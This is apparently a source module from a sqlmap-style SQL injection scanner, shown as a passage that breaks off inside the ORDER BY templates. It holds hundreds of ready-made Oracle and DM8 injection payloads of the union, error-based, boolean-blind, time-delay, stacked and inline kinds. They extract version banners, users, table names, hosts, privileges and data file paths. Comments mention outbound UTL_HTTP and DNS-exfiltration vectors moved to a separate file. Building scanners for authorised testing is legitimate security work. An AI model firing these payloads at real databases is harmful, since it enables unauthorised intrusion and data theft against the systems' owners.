// Oracle + DM8 payload 模板（从 payloads.js 拆分）
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符
// DM8 由 index.js 通过 JSON 深拷贝 Oracle 自动继承（Oracle 兼容模式）

export const oraclePayloads = {
  union: [
    "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
    "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
    '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
    "{ORIG}) UNION SELECT {NUM},banner,NULL FROM v$version-- -",
    "{ORIG}') UNION SELECT {NUM},banner,NULL FROM v$version-- -",
    "{ORIG} UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
    "{ORIG}' UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
    "{ORIG} UNION SELECT {NUM},user,instance_name FROM v$instance-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM user_tables WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM user_tab_cols WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT global_name FROM global_name),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT name FROM v$database),NULL FROM dual-- -",
    // —— 扩容：闭合组合（')) / ")）× 表达式族（对标 sqlmap UNION payload 矩阵）——
    "{ORIG}')) UNION SELECT {NUM},banner,NULL FROM v$version-- -",
    '{ORIG}")) UNION SELECT {NUM},banner,NULL FROM v$version-- -',
    "{ORIG}')) UNION ALL SELECT {NUM},user,NULL FROM dual-- -",
    '{ORIG}" UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -',
    "{ORIG} UNION SELECT {NUM},SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},SYS_CONTEXT('USERENV','SERVER_HOST'),NULL FROM dual-- -",
    "{ORIG} UNION ALL SELECT {NUM},(SELECT instance_name FROM v$instance),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT owner FROM all_tables WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG} UNION SELECT {NUM},(SELECT privilege FROM user_sys_privs WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT tablespace_name FROM user_tablespaces WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT granted_role FROM user_role_privs WHERE ROWNUM=1),NULL FROM dual-- -",
    '{ORIG}" UNION SELECT {NUM},user,(SELECT global_name FROM global_name) FROM dual-- -',
    "{ORIG} UNION SELECT {NUM},(SELECT host_name FROM v$instance),NULL FROM dual-- -",
    "{ORIG}' UNION ALL SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}')) UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
    // —— 扩容：多列 NULL 列数探测 / 字典计数 / SYS_CONTEXT / 复合闭合（对标 sqlmap UNION 列数探测矩阵）——
    "{ORIG}' UNION SELECT NULL,NULL,NULL FROM dual-- -",
    "{ORIG}' UNION ALL SELECT NULL,NULL,NULL FROM dual-- -",
    '{ORIG}" UNION SELECT NULL,NULL,NULL FROM dual-- -',
    "{ORIG}) UNION SELECT NULL,NULL FROM dual-- -",
    "{ORIG} UNION SELECT NULL,NULL,NULL,NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT COUNT(*) FROM user_tables),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT COUNT(*) FROM all_tables),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT COUNT(*) FROM user_objects),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT COUNT(*) FROM v$parameter),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT COUNT(*) FROM dual),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT file_name FROM dba_data_files WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT name FROM v$controlfile WHERE ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT VALUE FROM v$parameter WHERE name='processes' AND ROWNUM=1),NULL FROM dual-- -",
    "{ORIG}' UNION ALL SELECT {NUM},(SELECT global_name FROM global_name),NULL FROM dual-- -",
    '{ORIG}" UNION SELECT {NUM},(SELECT instance_name FROM v$instance),NULL FROM dual-- -',
    "{ORIG}')) UNION SELECT {NUM},(SELECT user FROM dual),NULL FROM dual-- -",
    "{ORIG}') UNION SELECT {NUM},(SELECT COUNT(*) FROM user_tables),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM user_tables WHERE ROWNUM=1),(SELECT column_name FROM user_tab_cols WHERE ROWNUM=1) FROM dual-- -",
    "{ORIG} UNION SELECT {NUM},(SELECT user FROM dual),(SELECT global_name FROM global_name) FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},SYS_CONTEXT('USERENV','DB_NAME'),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},SYS_CONTEXT('USERENV','HOST'),NULL FROM dual-- -",
    "{ORIG}' UNION SELECT {NUM},SYS_CONTEXT('USERENV','INSTANCE_NAME'),NULL FROM dual-- -",
    "{ORIG}' UNION ALL SELECT {NUM},(SELECT COUNT(*) FROM user_tables),NULL FROM dual-- -",
  ],
  error: [
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -",
    '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -',
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -",
    "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT user FROM dual)||'</a>').getDocumentVal()-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    // —— 扩容：XMLType / CTXSYS.DRITHSX.SN / UTL_INADDR 新目标 + TO_NUMBER 类型报错 ——
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT instance_name FROM v$instance))-- -",
    "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND 1=XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1)).getDocumentVal()-- -",
    "{ORIG}' AND 1=XMLTYPE((SELECT global_name FROM global_name)).getDocumentVal()-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND (SELECT TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual) IS NULL-- -",
    "{ORIG}' AND 1=TO_NUMBER((SELECT user FROM dual))-- -",
    // —— 扩容：UTL_INADDR 假主机名字面量报错（ORA-29257，无需子查询）+ ROWNUM 分页上下文适配 ——
    // Oracle 标准驱动不支持堆叠查询 → `; SELECT 1/0 FROM dual` 不可行；
    // 改用 `||` 串联子句注入技巧（{ORIG}||'1' 风格），单语句即触发 GET_HOST_ADDRESS 假主机名报错，
    // 兼容 ROWNUM 分页内层 WHERE 等非谓词位置（对标 sqlmap 分页注入向量）。
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')-- -",
    "{ORIG}||UTL_INADDR.GET_HOST_ADDRESS('x')-- -",
    "{ORIG} AND ROWNUM=1||UTL_INADDR.GET_HOST_ADDRESS('x')-- -",
    // —— 深度扩容：UTL_INADDR.GET_HOST_NAME 假主机名 / TO_NUMBER·TO_DATE·TO_TIMESTAMP 类型报错 / XMLType 多目标 ——
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME('x')-- -",
    "{ORIG}\" AND 1=UTL_INADDR.GET_HOST_NAME('x')-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT instance_name FROM v$instance))-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT owner FROM all_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=TO_NUMBER((SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND 1=TO_DATE((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=TO_TIMESTAMP((SELECT user FROM dual))-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT instance_name FROM v$instance)||'</a>').getDocumentVal()-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT global_name FROM global_name)||'</a>').getDocumentVal()-- -",
    "{ORIG}' AND 1=XMLTYPE((SELECT instance_name FROM v$instance)).getDocumentVal()-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT owner FROM all_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME('x')/**/",
    // [SQLMAP-PARITY] dbms_xmlgen XML extraction（纯报错回显，无外连）
    "{ORIG}' AND 1=CTXSYS.CONTEXT_ERROR((SELECT XMLType(dbms_xmlgen.getxml('SELECT banner FROM v$version WHERE rownum=1')).getStringVal() FROM dual))-- -",
    // 注：UTL_INADDR.GET_HOST_NAME((SELECT banner ...)) 会把 banner 当主机名发起 DNS 解析，
    // 属于 DNS 外带泄漏，已移出默认池，见 destructive.js（需 risk>=3）。
    // —— 扩容：UTL_INADDR 新闭合/目标矩阵（GET_HOST_NAME / GET_HOST_ADDRESS；对标 sqlmap UTL_INADDR 报错族）——
    '{ORIG}" AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -',
    "{ORIG}') AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT global_name FROM global_name))-- -",
    '{ORIG}" AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
    "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    "{ORIG}') AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -",
    '{ORIG}" AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
    "{ORIG}' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) IS NOT NULL-- -",
    "{ORIG}||UTL_INADDR.GET_HOST_NAME('x')-- -",
    // —— 扩容：CTXSYS.DRITHSX.SN 新闭合/目标（对标 sqlmap CTXSYS 报错族）——
    '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT instance_name FROM v$instance))-- -',
    "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT COUNT(*) FROM user_objects))-- -",
    "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT sysdate FROM dual))-- -",
    "{ORIG}' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) IS NOT NULL-- -",
    // —— 扩容：XMLType 新方法/闭合（getStringVal/getClobVal + 引号/括号变体；对标 sqlmap XMLType 报错族）——
    "{ORIG}' AND 1=XMLTYPE((SELECT table_name FROM user_tables WHERE ROWNUM=1)).getStringVal()-- -",
    "{ORIG}' AND 1=XMLTYPE((SELECT global_name FROM global_name)).getStringVal()-- -",
    "{ORIG}' AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT user FROM dual)||'</a>').getClobVal()-- -",
    '{ORIG}" AND 1=XMLTYPE(\'<?xml version="1.0"?><a>\'||(SELECT banner FROM v$version WHERE ROWNUM=1)||\'</a>\').getDocumentVal()-- -',
    "{ORIG}') AND 1=XMLTYPE('<?xml version=\"1.0\"?><a>'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)||'</a>').getDocumentVal()-- -",
    // —— 扩容：ORDSYS.ORD_DICOM 报错（对标 sqlmap ORDSYS 报错族）——
    "{ORIG}' AND 1=ORDSYS.ORD_DICOM.GET_DICOM_ATTRIBUTE((SELECT user FROM dual),2,1)-- -",
    "{ORIG}' AND 1=ORDSYS.ORD_DICOM.GET_DICOM_ATTRIBUTE((SELECT global_name FROM global_name),2,1)-- -",
    // —— 扩容：DBMS_UTILITY / DBMS_XMLQUERY / CTXSYS.CONTEXT_ERROR + dbms_xmlgen 多目标（对标 sqlmap dbms_xml* 报错族）——
    "{ORIG}' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual))-- -",
    "{ORIG}' AND 1=(SELECT DBMS_XMLQUERY.GETXML('SELECT user FROM dual'))-- -",
    "{ORIG}' AND 1=(SELECT DBMS_XMLQUERY.GETXML('SELECT global_name FROM global_name'))-- -",
    "{ORIG}' AND 1=CTXSYS.CONTEXT_ERROR((SELECT XMLType(dbms_xmlgen.getxml('SELECT user FROM dual')).getStringVal() FROM dual))-- -",
    "{ORIG}' AND 1=CTXSYS.CONTEXT_ERROR((SELECT XMLType(dbms_xmlgen.getxml('SELECT global_name FROM global_name')).getStringVal() FROM dual))-- -",
    "{ORIG}' AND 1=CTXSYS.CONTEXT_ERROR((SELECT XMLType(dbms_xmlgen.getxml('SELECT table_name FROM user_tables WHERE rownum=1')).getStringVal() FROM dual))-- -",
    // —— 扩容：1/0 除零（ORA-01476；非破坏性报错判别）——
    "{ORIG}' AND 1=(SELECT 1/0 FROM dual)-- -",
    "{ORIG}' AND (SELECT 1/0 FROM dual) IS NULL-- -",
    // —— 扩容：TO_NUMBER / TO_DATE / TO_TIMESTAMP / CAST 类型转换报错（ORA-01722 族；对标 sqlmap 类型转换报错）——
    "{ORIG}' AND 1=TO_NUMBER((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=TO_NUMBER((SELECT instance_name FROM v$instance))-- -",
    "{ORIG}' AND 1=TO_DATE((SELECT global_name FROM global_name))-- -",
    "{ORIG}' AND 1=TO_DATE((SELECT table_name FROM user_tables WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=TO_TIMESTAMP((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    "{ORIG}' AND 1=CAST((SELECT user FROM dual) AS NUMBER)-- -",
    "{ORIG}' AND 1=CAST((SELECT global_name FROM global_name) AS NUMBER)-- -",
    "{ORIG}' AND 1=TO_CHAR((SELECT 1 FROM dual WHERE 1=1))-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
    // [8,9] 数字上下文注释变体（-- - 结尾，对标 sqlmap 数字无引号上下文 + 注释清理）
    "{ORIG} AND 1=1-- -",
    "{ORIG} AND 1=2-- -",
    // [10] 注释符变体（/**/ 块注释结尾，Oracle 支持 -- 与 /**/；WAF 绕过 / 尾注释双通道）
    "{ORIG}' AND '1'='1/**/",
    // —— 深度扩容：子查询布尔（当前用户/版本首字符探测；真假对）——
    "{ORIG} AND (SELECT SUBSTR(user,1,1))='S'-- -",
    "{ORIG} AND (SELECT SUBSTR(user,1,1))='X'-- -",
    "{ORIG}' AND (SELECT SUBSTR(user,1,1))='S'-- -",
    "{ORIG}' AND (SELECT SUBSTR(user,1,1))='X'-- -",
    "{ORIG} AND (SELECT SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))='O'-- -",
    "{ORIG} AND (SELECT SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))='X'-- -",
    "{ORIG} AND (SELECT 1 FROM dual)=(SELECT 1 FROM dual)-- -",
    "{ORIG} AND (SELECT 1 FROM dual)=(SELECT 2 FROM dual)-- -",
    // [SQLMAP-PARITY] DECODE with DUAL / NVL boolean
    "{ORIG}' AND DECODE((SELECT 1 FROM dual WHERE 1=1), 1, 1, 0)=1-- -",
    "{ORIG}' AND NVL((SELECT 1 FROM dual WHERE 1=1), 0)=1-- -",
    // —— 扩容：闭合组合布尔对（')) / ") 嵌套；对标 sqlmap boundary 闭合矩阵）——
    "{ORIG}') AND '1'='1'-- -",
    "{ORIG}') AND '1'='2'-- -",
    "{ORIG}')) AND 1=1-- -",
    "{ORIG}')) AND 1=2-- -",
    '{ORIG}") AND 1=1-- -',
    '{ORIG}") AND 1=2-- -',
    // —— 扩容：注释符变体（/**/ 尾注释双通道；Oracle 无 #，仅 -- 与 /**/）——
    "{ORIG}' AND 1=1/**/",
    "{ORIG}' AND 1=2/**/",
    // —— 扩容：SUBSTR/ASCII 首字符探测（真假对；对标 sqlmap boolean 字符级盲注）——
    "{ORIG}' AND ASCII(SUBSTR(user,1,1))=83-- -",
    "{ORIG}' AND ASCII(SUBSTR(user,1,1))=88-- -",
    "{ORIG}' AND (SELECT ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)) FROM dual)>64-- -",
    "{ORIG}' AND (SELECT ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)) FROM dual)>65-- -",
    // —— 扩容：LIKE 变体（首字符前缀真假对）——
    "{ORIG}' AND user LIKE 'S%'-- -",
    "{ORIG}' AND user LIKE 'X%'-- -",
    // —— 扩容：dual 表 / 字典计数 / EXISTS / INSTR / LENGTH 布尔对 ——
    "{ORIG} AND (SELECT COUNT(*) FROM all_tables)>0-- -",
    "{ORIG} AND (SELECT COUNT(*) FROM all_tables)<0-- -",
    "{ORIG} AND EXISTS(SELECT 1 FROM dual WHERE 1=1)-- -",
    "{ORIG} AND EXISTS(SELECT 1 FROM dual WHERE 1=2)-- -",
    "{ORIG}' AND 1=(SELECT COUNT(*) FROM dual WHERE 1=1)-- -",
    "{ORIG}' AND 1=(SELECT COUNT(*) FROM dual WHERE 1=2)-- -",
    "{ORIG} AND (SELECT 1 FROM dual WHERE ROWNUM=1)=1-- -",
    "{ORIG} AND (SELECT 1 FROM dual WHERE ROWNUM=1)=2-- -",
    "{ORIG}' AND INSTR(user,'S')>0-- -",
    "{ORIG}' AND INSTR(user,'X')>0-- -",
    "{ORIG}' AND (SELECT LENGTH(user) FROM dual)>1-- -",
    "{ORIG}' AND (SELECT LENGTH(user) FROM dual)>1000-- -",
    // —— 扩容：DECODE / NVL 恒真恒假对（对标 sqlmap DECODE boolean）——
    "{ORIG}' AND DECODE(1,1,1,0)=1-- -",
    "{ORIG}' AND DECODE(1,2,1,0)=1-- -",
    "{ORIG}' AND NVL(1,0)=1-- -",
    "{ORIG}' AND NVL(0,0)=1-- -",
  ],
  time: [
    // Oracle 无原生 SLEEP；用 DBMS_PIPE.RECEIVE_MESSAGE 挂起指定秒数（无需特权，近似延迟）
    "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    // 备选：DBMS_LOCK.SLEEP（更语义化，但需 LOCK 权限，部分环境受限）
    "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
    "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
    "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    "{ORIG}') AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM DUAL)=0-- -",
    "{ORIG} AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
    "{ORIG}' AND (SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0)-- -",
    // —— 扩容：括号闭合组合 / DBMS_LOCK.SLEEP / DECODE 重查询变体 ——
    '{ORIG}" AND DBMS_PIPE.RECEIVE_MESSAGE(\'sqli\',{SLEEP})=0-- -',
    "{ORIG}')) AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
    "{ORIG}') AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
    "{ORIG}' AND (SELECT DECODE(SUM(b.object_id),NULL,1,1) FROM all_objects a, all_objects b WHERE a.object_id=b.object_id)>0-- -",
    "{ORIG}' AND 1=(SELECT CASE WHEN DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0 THEN 1 ELSE 2 END FROM dual)-- -",
    // —— 注释符变体（/**/ 结尾，与 -- - 双通道互补，对标 sqlmap 尾注释双写）——
    "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0/**/",
    // —— 深度扩容：DBMS_PIPE 谓词化（1=RECEIVE_MESSAGE）+ 注释符变体 + CASE 延迟 ——
    "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -",
    "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})-- -",
    "{ORIG}') AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -",
    "{ORIG}')) AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})-- -",
    "{ORIG}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})/**/",
    "{ORIG}' AND (SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0) IS NOT NULL-- -",
    "{ORIG}' AND 1=(SELECT CASE WHEN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0 THEN 1 ELSE 2 END FROM dual)-- -",
    "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) IS NOT NULL-- -",
    // [SQLMAP-PARITY] DBMS_LOCK.SLEEP（sleep 时长走 {SLEEP} 配置，保证阈值可判定）
    "{ORIG}' AND DBMS_LOCK.SLEEP({SLEEP})-- -",
    // 注：UTL_HTTP.REQUEST 外连向量已移出默认池 —— 原实现硬编码 attacker.com，
    // 会在默认 time 检测中让目标库向第三方域名发起 HTTP 请求。见 destructive.js。
    // —— 扩容：DBMS_PIPE 谓词值变体 / 条件延迟（对标 sqlmap oracle.xml time 族）——
    "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=1-- -",
    "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})!=0-- -",
    "{ORIG}' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) FROM dual)-- -",
    "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) FROM dual)=1-- -",
    "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('x',{SLEEP})>0-- -",
    "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('probe',{SLEEP}) FROM dual) IS NOT NULL-- -",
    "{ORIG} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) FROM dual)=0-- -",
    "{ORIG}') AND (SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0) IS NOT NULL-- -",
    "{ORIG}' AND (SELECT COUNT(*) FROM all_objects WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0)>0-- -",
    "{ORIG}' AND (SELECT COUNT(*) FROM user_tables WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0)>0-- -",
    "{ORIG}' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) END=0-- -",
    "{ORIG}' AND CASE WHEN 1=2 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) END=0-- -",
    "{ORIG}' AND DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}),0)=0-- -",
    "{ORIG}' AND DECODE(1,2,DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}),0)=0-- -",
    "{ORIG}' AND 1=(SELECT DECODE(1,1,DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}),0) FROM dual)-- -",
    // —— 扩容：DBMS_LOCK.SLEEP 谓词/闭合/条件变体（需 LOCK 权限，受限环境自动失败不计入命中）——
    "{ORIG}' AND DBMS_LOCK.SLEEP({SLEEP}) IS NULL-- -",
    "{ORIG}' AND 1=DBMS_LOCK.SLEEP({SLEEP})-- -",
    "{ORIG}') AND DBMS_LOCK.SLEEP({SLEEP})-- -",
    '{ORIG}" AND DBMS_LOCK.SLEEP({SLEEP})-- -',
    "{ORIG}') AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
    "{ORIG}' AND (SELECT 1 FROM dual WHERE DBMS_LOCK.SLEEP({SLEEP}) IS NULL) IS NOT NULL-- -",
    "{ORIG}' AND (SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP({SLEEP}) ELSE 0 END FROM dual) IS NULL-- -",
    // —— 扩容：注释符变体（/**/ 尾注释双通道）——
    "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP})=0/**/",
    "{ORIG}' AND DBMS_LOCK.SLEEP({SLEEP})/**/",
  ],
  // Oracle 标准驱动不支持堆叠查询，检测器对 Oracle dbms 直接返回未命中（_resolveDbmsList 跳过 Oracle）。
  // [SQLMAP-PARITY] Oracle 不支持堆叠查询（OCI 驱动限制；sqlmap 同样跳过 stacked 向量）。
  // 但 DM8（达梦）深拷贝继承本数组且 SUPPORTED.DM8.stacked=true（达梦支持多语句），以下非破坏性
  // 延迟型堆叠模板供 DM8 路径消费；均为 PL/SQL 匿名块 / SELECT...FROM dual 形式，无写/无 DDL。
  stacked: [
    "{ORIG}'; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}); END;-- -",
    "{ORIG}; BEGIN DBMS_LOCK.SLEEP({SLEEP}); END;-- -",
    "{ORIG}'; BEGIN DBMS_LOCK.SLEEP({SLEEP}); END;-- -",
    "{ORIG}'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) FROM dual-- -",
    "{ORIG}); BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}); END;-- -",
  ],
  // inline 内联子查询（对标 sqlmap Q / oracle.xml 标量回显）：把 (SELECT ... FROM dual) 注入
  // 到值位置，若目标把 SQL 求值结果随响应回显即确认内联通道。非破坏性只读子查询，无 UNION。
  // 注：InlineQueryDetector 当前自带标记子查询构造（_build），本数组为模板资产备查/扩展用。
  inline: [
    "{ORIG}'||(SELECT user FROM dual)||'-- -",
    "{ORIG}||(SELECT user FROM dual)-- -",
    "{ORIG}'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'-- -",
    "{ORIG}||(SELECT global_name FROM global_name)-- -",
    "{ORIG}'||(SELECT instance_name FROM v$instance)||'-- -",
    "{ORIG}'||(SELECT table_name FROM user_tables WHERE ROWNUM=1)||'-- -",
  ],
};

// Oracle 子句位置感知模板（CLAUSE_PAYLOADS.Oracle）
export const oracleClauses = {
  // ORDER BY 列位置：标量子查询需 FROM dual；假分支除零报 ORA-01476
  orderby: {
    boolean: [
      ["{ORIG},(SELECT 1 FROM dual)-- -", "{ORIG},(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END FROM dual)-- -"],
      // 直接 1/0 除零变体（Oracle 无堆叠；ORDER BY 位逗号拼接标量子查询，假=1/0 触发 ORA-01476）
